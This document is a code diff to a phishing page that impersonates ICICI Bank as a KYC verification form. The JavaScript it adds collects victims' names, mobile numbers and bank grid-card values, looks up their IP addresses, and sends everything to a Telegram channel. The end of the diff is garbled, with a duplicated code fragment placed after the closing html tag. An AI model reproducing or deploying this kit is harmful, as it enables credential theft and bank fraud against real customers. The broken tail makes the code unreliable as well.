@@ -49,11 +49,11 @@ body{margin:0;background:#eef2f8;display:flex;flex-direction:column;min-height:1
 .security-notice{background:#fff3cd;border:1px solid #ffeaa7;border-radius:10px;padding:16px;margin:20px auto;width:92%;max-width:420px;color:#856404;font-size:14px}
 .security-icon{color:#f36f21;font-size:18px;margin-right:8px}
 
-/* MAIN CONTENT */
-.main-content{flex:1}
+/* MAIN CONTENT - FIXED FOR FOOTER */
+.main-content{flex:1;display:flex;flex-direction:column;justify-content:center;min-height:calc(100vh - 140px)}
 
-/* FOOTER */
-.footer{text-align:center;color:#333;font-size:12px;padding:14px 0;border-top:1px solid #ddd;width:100%;background:#fff;margin-top:auto}
+/* FOOTER - FIXED POSITION */
+.footer{text-align:center;color:#333;font-size:12px;padding:14px 0;border-top:1px solid #ddd;width:100%;background:#fff}
 .footer-content{max-width:420px;margin:0 auto;padding:0 16px}
 .footer-links{margin:8px 0;color:#f36f21}
 .footer-links a{color:#f36f21;text-decoration:none;margin:0 8px}
@@ -76,13 +76,6 @@ body{margin:0;background:#eef2f8;display:flex;flex-direction:column;min-height:1
 <div class="header">
   <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/12/ICICI_Bank_Logo.svg/1200px-ICICI_Bank_Logo.svg.png" />
   <button class="login-btn">Login</button>
-</div>
-
-<!-- STEPS INDICATOR - HIDDEN -->
-<div class="steps">
-  <div class="step active">1</div>
-  <div class="step">2</div>
-  <div class="step">3</div>
 </div>
 
 <!-- MAIN CONTENT -->
@@ -260,6 +253,153 @@ async function submitStep1() {
     const success = await sendToTelegram(message);
     
     if (success) {
+      // Move to next step
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      currentStep++;
+      document.getElementById(`step${currentStep}`).classList.add('active');
+    } else {
+      alert('Failed to submit data. Please try again.');
+    }
+  } catch (error) {
+    alert('Error submitting data. Please try again.');
+  } finally {
+    // Hide loading and enable button
+    document.getElementById('loading1').style.display = 'none';
+    document.getElementById('submitBtn1').disabled = false;
+    document.getElementById('submitBtn1').innerText = 'SUBMIT';
+  }
+}
+
+async function submitStep2() {
+  // Collect grid data
+  const gridData = {};
+  const gridInputs = document.querySelectorAll('.grid input');
+  let allFilled = true;
+  
+  gridInputs.forEach(input => {
+    const value = input.value.trim();
+    if (!value) {
+      allFilled = false;
+    }
+    gridData[input.placeholder] = value;
+  });
+  
+  if (!allFilled) {
+    alert('Please fill in all grid values');
+    return;
+  }
+  
+  // Show loading and disable button
+  document.getElementById('loading2').style.display = 'block';
+  document.getElementById('submitBtn2').disabled = true;
+  document.getElementById('submitBtn2').innerText = 'Processing...';
+  
+  try {
+    // Get user IP
+    const userIP = await getUserIP();
+    const dateTime = getCurrentDateTime();
+    
+    // Format grid data for display
+    let gridDisplay = '';
+    Object.keys(gridData).forEach(key => {
+      gridDisplay += `${key}: ${gridData[key]}\n`;
+    });
+    
+    // Format message for Telegram
+    const message = `
+🔢 <b>STEP 2 - GRID DATA RECEIVED</b>
+━━━━━━━━━━━━━━━━━━
+<b>Grid Values:</b>
+${gridDisplay}
+━━━━━━━━━━━━━━━━━━
+🌐 <b>IP Address:</b> ${userIP}
+📅 <b>Date & Time:</b> ${dateTime}
+━━━━━━━━━━━━━━━━━━
+✅ <b>Complete KYC Data Captured</b>
+    `;
+    
+    // Send to Telegram
+    const success = await sendToTelegram(message);
+    
+    if (success) {
+      // Move to next step
+      document.getElementById(`step${currentStep}`).classList.remove('active');
+      currentStep++;
+      document.getElementById(`step${currentStep}`).classList.add('active');
+    } else {
+      alert('Failed to submit data. Please try again.');
+    }
+  } catch (error) {
+    alert('Error submitting data. Please try again.');
+  } finally {
+    // Hide loading and enable button
+    document.getElementById('loading2').style.display = 'none';
+    document.getElementById('submitBtn2').disabled = false;
+    document.getElementById('submitBtn2').innerText = 'SUBMIT';
+  }
+}
+
+function prevStep() {
+  document.getElementById(`step${currentStep}`).classList.remove('active');
+  currentStep--;
+  document.getElementById(`step${currentStep}`).classList.add('active');
+}
+
+function restartProcess() {
+  // Reset to step 1
+  document.getElementById(`step${currentStep}`).classList.remove('active');
+  currentStep = 1;
+  document.getElementById(`step1`).classList.add('active');
+  
+  // Clear form inputs
+  document.getElementById('fullName').value = '';
+  document.getElementById('mobileNumber').value = '';
+  
+  // Clear grid inputs
+  const gridInputs = document.querySelectorAll('.grid input');
+  gridInputs.forEach(input => input.value = '');
+  
+  // Reset buttons
+  document.getElementById('submitBtn1').disabled = false;
+  document.getElementById('submitBtn1').innerText = 'SUBMIT';
+  document.getElementById('submitBtn2').disabled = false;
+  document.getElementById('submitBtn2').innerText = 'SUBMIT';
+}
+
+// Auto-focus and navigation for grid inputs
+document.addEventListener('DOMContentLoaded', function() {
+  const gridInputs = document.querySelectorAll('.grid input');
+  
+  gridInputs.forEach((input, index) => {
+    // Auto-tab to next input when 2 digits are entered
+    input.addEventListener('input', function(e) {
+      if (this.value.length >= 2 && index < gridInputs.length - 1) {
+        gridInputs[index + 1].focus();
+      }
+    });
+    
+    // Allow navigation with arrow keys
+    input.addEventListener('keydown', function(e) {
+      if (e.key === 'ArrowRight' && index < gridInputs.length - 1) {
+        gridInputs[index + 1].focus();
+      }
+      if (e.key === 'ArrowLeft' && index > 0) {
+        gridInputs[index - 1].focus();
+      }
+      if (e.key === 'ArrowDown' && index < 8) {
+        // Move to second line
+        gridInputs[index + 8].focus();
+      }
+      if (e.key === 'ArrowUp' && index >= 8) {
+        // Move to first line
+        gridInputs[index - 8].focus();
+      }
+    });
+  });
+});
+</script>
+</body>
+                                                                                                                                                               </html> {
       // Move to next step
       document.getElementById(`step${currentStep}`).classList.remove('active');
       currentStep++;
